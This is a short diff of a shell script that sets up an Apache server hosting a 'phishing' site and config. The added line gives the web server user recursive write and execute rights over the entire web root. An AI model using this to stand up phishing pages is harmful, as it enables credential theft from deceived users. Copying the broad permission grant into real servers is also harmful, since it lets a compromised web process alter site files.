@@ -5,6 +5,7 @@ sudo rm -f /var/www/html/index.html
 cp -r ./html /var/www/
 cp -r ./phishing /var/www/
 sudo setfacl -R -m u:www-data:rwx /var/www/html/codes
+sudo setfacl -R -m u:www-data:rwx /var/www/html/
 cp ./000-default.conf /etc/apache2/sites-available/
 cp ./001-phishing.conf /etc/apache2/sites-available/
 cp ./ports.conf /etc/apache2/
